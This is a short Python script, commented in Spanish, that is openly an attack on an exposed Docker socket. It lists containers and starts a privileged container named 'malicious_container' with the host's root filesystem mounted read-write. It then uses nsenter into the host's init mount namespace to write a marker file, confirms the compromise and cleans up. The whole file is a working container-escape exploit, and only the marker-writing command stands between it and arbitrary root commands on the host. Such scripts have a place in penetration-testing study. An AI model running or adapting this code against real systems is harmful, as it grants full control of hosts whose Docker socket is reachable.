import docker
import json

def docker_socket_attack():
    try:
        # Conectar al socket de Docker (normalmente en /var/run/docker.sock)
        client = docker.DockerClient(base_url='unix:///var/run/docker.sock')
        
        # Listar contenedores
        containers = client.containers.list()
        print(f"[+] Encontrados {len(containers)} contenedores")
        
        # Crear contenedor privilegiado con acceso al host
        malicious_container = client.containers.run(
            "alpine",
            "nsenter --mount=/host/proc/1/ns/mnt -- sh -c 'echo Host compromised! > /tmp/pwned'",
            volumes={'/': {'bind': '/host', 'mode': 'rw'}},
            detach=True,
            privileged=True,
            name="malicious_container"
        )
        
        print("[+] Contenedor malicioso creado")
        print(f"[+] ID: {malicious_container.short_id}")
        
        # Verificar si el ataque tuvo éxito
        result = malicious_container.exec_run("cat /host/tmp/pwned")
        if "Host compromised!" in result.output.decode():
            print("[+] ¡Ataque exitoso! Host comprometido")
        
        # Limpiar
        malicious_container.stop()
        malicious_container.remove()
        
    except Exception as e:
        print(f"[-] Error: {str(e)}")

if __name__ == "__main__":
    docker_socket_attack()